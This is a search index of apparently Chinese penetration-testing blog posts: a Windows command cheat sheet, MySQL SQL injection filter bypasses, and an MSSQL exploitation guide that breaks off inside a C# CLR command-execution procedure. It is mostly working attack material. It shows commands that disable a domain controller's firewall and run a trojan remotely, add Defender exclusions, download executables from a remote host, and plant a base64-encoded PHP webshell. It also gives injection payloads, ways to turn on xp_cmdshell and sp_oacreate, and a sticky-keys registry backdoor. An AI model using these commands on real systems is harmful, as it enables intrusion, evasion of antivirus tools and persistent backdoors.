<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windwos 命令备忘录</title>
      <link href="/posts/cfde7db2.html"/>
      <url>/posts/cfde7db2.html</url>
      
        <content type="html"><![CDATA[<h1 id="netsh-关闭防火墙"><a href="#netsh-关闭防火墙" class="headerlink" title="netsh 关闭防火墙"></a>netsh 关闭防火墙</h1><pre class="language-none"><code class="language-none">netsh advfilewall set publicprofile state offnetsh advfirewall set allprofiles state off</code></pre><h1 id="netsh-端口转发"><a href="#netsh-端口转发" class="headerlink" title="netsh 端口转发"></a>netsh 端口转发</h1><pre class="language-none"><code class="language-none"># 开启转发netsh interface portproxy add v4tov4 listenaddress&#x3D;LOCAL_ADDRESS listenport&#x3D;LOCAL_PORT connectaddress&#x3D;DEST_ADDRESS connectport&#x3D;DEST_PORT# 查看存在的转发netsh interface portproxy show all# 删除指定规则netsh interface portproxy delete v4tov4 listenport&#x3D;LOCAL_PORT listenaddress&#x3D;LOCAL_ADDRESS</code></pre><h1 id="sc-创建服务"><a href="#sc-创建服务" class="headerlink" title="sc 创建服务"></a>sc 创建服务</h1><p>基本用法</p><pre class="language-none"><code class="language-none">sc create &lt;SERVICE_NAME&gt; binpath&#x3D; &quot;&lt;COMMEND&gt;&quot;sc description &lt;SERVICE_NAME&gt;   &quot;DESCRIPTION&quot; 设置服务的描述字符串 sc config &lt;SERVICE_NAME&gt;   start&#x3D; auto  设置这个服务为自动启动 net start &lt;SERVICE_NAME&gt;   启动服务</code></pre><p>可以通过 IPC 连接在远程主机上创建服务</p><pre class="language-none"><code class="language-none"># 关闭域控防火墙sc \\\\DC create wall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;sc \\\\DC start wall# 执行木马sc \\\\DC create shell binpath&#x3D; &quot;c:\\shell.exe&quot;sc \\\\DC start shell</code></pre><h1 id="开关-3389-端口"><a href="#开关-3389-端口" class="headerlink" title="开关 3389 端口"></a>开关 3389 端口</h1><pre class="language-none"><code class="language-none"># 开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# 关闭REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</code></pre><h1 id="开关-RDP"><a href="#开关-RDP" class="headerlink" title="开关 RDP"></a>开关 RDP</h1><pre class="language-none"><code class="language-none"># 开启wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1# 关闭wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre><h1 id="锁屏"><a href="#锁屏" class="headerlink" title="锁屏"></a>锁屏</h1><pre class="language-none"><code class="language-none">Rundll32.exe user32.dll，LockWorkStation</code></pre><h1 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h1><pre class="language-none"><code class="language-none">certutil.exe -urlcache -split -f [URL] output.file# base64解码certutil.exe -decode encode.file decode.file</code></pre><h1 id="查询-defender-白名单路径"><a href="#查询-defender-白名单路径" class="headerlink" title="查询 defender 白名单路径"></a>查询 defender 白名单路径</h1><pre class="language-none"><code class="language-none">reg query &quot;HKLM\SOFTWARE\Microsoft\windows Defender\Exclusions\Paths&quot;</code></pre><h1 id="修改-defender-白名单"><a href="#修改-defender-白名单" class="headerlink" title="修改 defender 白名单"></a>修改 defender 白名单</h1><pre class="language-none"><code class="language-none">Add-MpPreference -ExclusionPath &quot;C:\Utils&quot; # 添加白名单路径Add-MpPreference -ExclusionExtension &quot;C:\Utils\veil.exe&quot; # 添加白名单程序</code></pre><h1 id="PowerShell-下载远程文件"><a href="#PowerShell-下载远程文件" class="headerlink" title="PowerShell 下载远程文件"></a>PowerShell 下载远程文件</h1><pre class="language-none"><code class="language-none">powershell (new-object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.93.100:8000&#x2F;win.exe&#39;,&#39;C:\win.exe&#39;)</code></pre><h1 id="替换文件中部分内容并写入到原文件"><a href="#替换文件中部分内容并写入到原文件" class="headerlink" title="替换文件中部分内容并写入到原文件"></a>替换文件中部分内容并写入到原文件</h1><pre class="language-none"><code class="language-none">powershell ((cat C:\Users\administrator\Desktop\info.txt) -replace &#39;somethings&#39;, &#39;anothor things&#39;) | set-content -path C:\Users\administrator\Desktop\info.txt</code></pre><h1 id="PowerShell-中使用其他用户身份执行命令"><a href="#PowerShell-中使用其他用户身份执行命令" class="headerlink" title="PowerShell 中使用其他用户身份执行命令"></a>PowerShell 中使用其他用户身份执行命令</h1><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$passwd</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">"PASSWORD"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token punctuation">(</span><span class="token string">"DOMAIN\USERNAME"</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token comment"># 执行命令</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>computername localhost <span class="token punctuation">[</span><span class="token operator">-</span>ConfigurationName dc_manage<span class="token punctuation">]</span> <span class="token operator">-</span>credential <span class="token variable">$cred</span> <span class="token operator">-</span>command <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName localhost <span class="token operator">-</span>Credential <span class="token variable">$cred</span> <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span></code></pre><h1 id="查找指定文件"><a href="#查找指定文件" class="headerlink" title="查找指定文件"></a>查找指定文件</h1><p>递归查询 C 盘下 index.html 文件路径</p><pre class="language-none"><code class="language-none">dir &#x2F;s &#x2F;b c:\index.html</code></pre><p>对无回显 RCE 的 web 机器可以通过配合该命令将命令执行结果写入到文件中，达到半回显效果</p><p>写入命令执行结果</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&quot;dir &#x2F;s &#x2F;b c:\index.html&quot;) do (whoami &gt; %i\..\whoami.txt)</code></pre><p>写入一句话马</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\1.jpg&#39;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA&#x2F;Pgo&#x3D; &gt; %i\..\base64.txt)for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\base64.txt&#39;) do (certutil.exe -decode %i\..\base64.txt %i\..\1.php)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL 关键字过滤 Bypass</title>
      <link href="/posts/53b8e68.html"/>
      <url>/posts/53b8e68.html</url>
      
        <content type="html"><![CDATA[<h1 id="过滤-information-schema"><a href="#过滤-information-schema" class="headerlink" title="过滤 information_schema"></a>过滤 information_schema</h1><p>在 mysql 5.7 中新增了 sys.schema,基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据</p><h2 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h2><p>存在自增字段时可以使用 <code>sys.schema_auto_increment_columns</code> 获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_auto_increment_columns <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>没有自增字段时可以使用 <code>sys.schema_table_statistics_with_buffer</code> 获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql">elect table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h2><p>使用 <code>join .. using</code> 获取字段名</p><p><code>select * from (select * from users as a join users as b)as c;</code></p><p>报错中可以得到第一个字段名</p><p><code>ERROR 1060 (42S21): Duplicate column name &#39;uid&#39;</code></p><p>将 <code>uid</code> 加入到 using 中</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>MYSQL 版本大于 5.7，root 权限</p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>使用子查询可以在不知道列名的情况下获取数据</p><p>注意点</p><ul><li>要查询的列需要用 `` 来包裹</li><li>需要知道表中有多少列</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># admin 表存在</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># ` 被过滤时使用别名代替</span><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># 查询多列</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span></code></pre><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><ul><li>使用注释绕过，<code>/**/</code>，<code>/*!*/</code></li><li>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 <code>()</code> 包围，并且两端可以没有多余的空格</li><li>使用其他空白符替代空格，<code>%20%09%0d %0b %0c %0d %a0%0a</code></li></ul><h1 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h1><p>使用 join 绕过</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">4</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span></code></pre><p>limit 的另一种写法：<code>limit M offset N</code>，等价于 <code>limit M, N</code></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/">https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MYSQL </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL 一般利用方式</title>
      <link href="/posts/5beaca16.html"/>
      <url>/posts/5beaca16.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL Server 是 Microsoft 开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的 DBMS 之一。SQL Server 具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等</p><p>在 2017 版之前，SQL Server 仅适用于 Windows。 SQL Server 2017 中最大的变化之一是，它现在可在 Linux 和 Docker 容器上使用。 这意味着可以在 Mac 上运行 SQL Server</p><h1 id="危险的存储过程"><a href="#危险的存储过程" class="headerlink" title="危险的存储过程"></a>危险的存储过程</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="查询-xp-cmdshell-存储过程是否存在"><a href="#查询-xp-cmdshell-存储过程是否存在" class="headerlink" title="查询 xp_cmdshell 存储过程是否存在"></a>查询 xp_cmdshell 存储过程是否存在</h3><p>xtype 为对象类型，xtype&#x3D;’x’，表示存储过程的对象类型为扩展存储过程</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span> <span class="token comment"># 存在则返回 1</span></code></pre><h3 id="xp-cmdshell-的开启与关闭"><a href="#xp-cmdshell-的开启与关闭" class="headerlink" title="xp_cmdshell 的开启与关闭"></a>xp_cmdshell 的开启与关闭</h3><p>开启</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><p>关闭</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><h3 id="恢复-xp-cmdshell-存储过程"><a href="#恢复-xp-cmdshell-存储过程" class="headerlink" title="恢复 xp_cmdshell 存储过程"></a>恢复 xp_cmdshell 存储过程</h3><p>Error Message: 未能找到存储过程 ‘master..xp_cmdshell’，即 xp_cmdshell 被删除，恢复方式如下</p><p>第一步删除</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_addextendedproc<span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_oacreate<span class="token keyword">exec</span> sp_dropextendedproc <span class="token string">'xp_cmdshell'</span></code></pre><p>第二步恢复</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"sp_oacreate"</span><span class="token punctuation">,</span><span class="token string">"odsole70.dll"</span><span class="token punctuation">)</span><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><p>上传 xplog70.dll，恢复扩展存储过过程 xp_cmdshell</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">"xplog70.dll"</span><span class="token punctuation">)</span></code></pre><h2 id="注册表相关操作"><a href="#注册表相关操作" class="headerlink" title="注册表相关操作"></a>注册表相关操作</h2><p>SQL Server 存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring 等</p><h3 id="xp-regread-读注册表"><a href="#xp-regread-读注册表" class="headerlink" title="xp_regread 读注册表"></a>xp_regread 读注册表</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regread <span class="token string">'HKEY_current_user'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span><span class="token punctuation">,</span><span class="token string">'sCountry'</span><span class="token comment"># exec xp_regread [键], [子键], [键值]</span><span class="token keyword">exec</span> xp_regread N<span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> N<span class="token string">'SYSTEM\CurrentControlSet\Services\MSSEARCH'</span> <span class="token comment"># 判断子健是否存在</span></code></pre><h3 id="xp-regaddmultistring-枚举可用的注册表键值"><a href="#xp-regaddmultistring-枚举可用的注册表键值" class="headerlink" title="xp_regaddmultistring 枚举可用的注册表键值"></a>xp_regaddmultistring 枚举可用的注册表键值</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regenumkeys <span class="token string">'HKEY_CURRENT_USER'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span></code></pre><h3 id="xp-regwrite-修改注册表"><a href="#xp-regwrite-修改注册表" class="headerlink" title="xp_regwrite 修改注册表"></a>xp_regwrite 修改注册表</h3><p>查看 xp_regwrite 是否启用</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_regwrite'</span></code></pre><p>开启 xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span></code></pre><p>关闭 xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">RECONFIGURE</span></code></pre><p>修改注册表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_regwrite <span class="token variable">@rootkey</span><span class="token operator">=</span><span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token variable">@key</span><span class="token operator">=</span><span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span><span class="token punctuation">,</span><span class="token variable">@value_name</span><span class="token operator">=</span><span class="token string">'Debugger'</span><span class="token punctuation">,</span><span class="token variable">@type</span><span class="token operator">=</span><span class="token string">'REG_SZ'</span><span class="token punctuation">,</span><span class="token variable">@value</span><span class="token operator">=</span><span class="token string">'c:\windows\system32\cmd.exe'</span><span class="token comment"># 修改粘滞键的键值</span></code></pre><h3 id="xp-regdeletekey-删除指定注册表键值对"><a href="#xp-regdeletekey-删除指定注册表键值对" class="headerlink" title="xp_regdeletekey 删除指定注册表键值对"></a>xp_regdeletekey 删除指定注册表键值对</h3><p>删除粘滞键的键值</p><pre class="language-sql" data-language="sql"><code class="language-sql">xp_regdeletekey <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> <span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span></code></pre><h2 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h2><p>判读文件是否存在，第一列返回 0 表示文件不存在，返回 1 表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_fileexist <span class="token string">'C:\Users\MSSQLSERVER\1.txt'</span></code></pre><h2 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h2><p>列出当前目录</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_subdirs <span class="token string">"C:\\"</span></code></pre><h2 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h2><p>获取服务器名称</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_getnetname</code></pre><h2 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h2><p>获取服务器信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_msver</code></pre><h1 id="SQL-Server-COM-组件"><a href="#SQL-Server-COM-组件" class="headerlink" title="SQL Server COM 组件"></a>SQL Server COM 组件</h1><p>SQL Server 中的 COM 组件 SP_OACREATE，执行系统命令，但是此利用方法无回显</p><h2 id="查询-SP-OACREATE-是否存在"><a href="#查询-SP-OACREATE-是否存在" class="headerlink" title="查询 SP_OACREATE 是否存在"></a>查询 SP_OACREATE 是否存在</h2><p>返回 1 则存在</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'SP_OACREATE'</span></code></pre><h2 id="SP-OACREATE-的开启与关闭"><a href="#SP-OACREATE-的开启与关闭" class="headerlink" title="SP_OACREATE 的开启与关闭"></a>SP_OACREATE 的开启与关闭</h2><p>开启</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><p>关闭</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@shell</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output <span class="token keyword">exec</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'C:\Windows\System32\cmd.exe /c whoami /all > C:\\Users\\MSSQLSERVER\\test.txt'</span></code></pre><h1 id="SQL-Server-CLR-相关利用"><a href="#SQL-Server-CLR-相关利用" class="headerlink" title="SQL Server CLR 相关利用"></a>SQL Server CLR 相关利用</h1><p>公共语言运行时 (CLR) 集成编程概念<br>从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p><p>CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地</p><p>利用步骤</p><ol><li>编写 CLR</li><li>启用 MSSQL CLR 功能</li><li>利用 SQL 语句导入程序集</li><li>执行系统命令</li></ol><h2 id="编写-CLR"><a href="#编写-CLR" class="headerlink" title="编写 CLR"></a>编写 CLR</h2><p>使用 Visual Studio 创建工程</p><p><img src="/posts/5beaca16/image-20220320205141716.png" alt="image-20220320205141716"></p><p>修改目标平台和勾选创建脚本，这里是 SQL Server 2014</p><p><img src="/posts/5beaca16/image-20220320205354905.png" alt="image-20220320205354905"></p><p>修改目标框架和权限级别为 UNSAFE</p><p><img src="/posts/5beaca16/image-20220320205406216.png" alt="image-20220320205406216"></p><blockquote><p>在 SQL Server 2005 中引入了从 MSSQL 运行.NET 代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net 程序集时，会给它们指定一个权限级别<br>其权限集有三个选项</p><blockquote><p>SAFE：基本上只将 MSSQL 数据集暴露给代码，其他大部分操作则都被禁止<br>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码<br>UNSAFE：允许使用任何代码</p></blockquote></blockquote><p>创建 SQL CLR C# 存储过程</p><p><img src="/posts/5beaca16/image-20220320205413749.png" alt="image-20220320205413749"></p><p>代码如下</p><pre class="language-c#" data-language="c#"><code class="language-c#">using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using System.Diagnostics;using System.Text;using Microsoft.SqlServer.Server;public partial class StoredProcedures&#123;    [Microsoft.SqlServer.Server.SqlProcedure]    public static void ExecCommand (string cmd)    &#123;        &#x2F;&#x2F; 在此处放置代码        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));    &#125;    public static string RunCommand(string filename,string arguments)    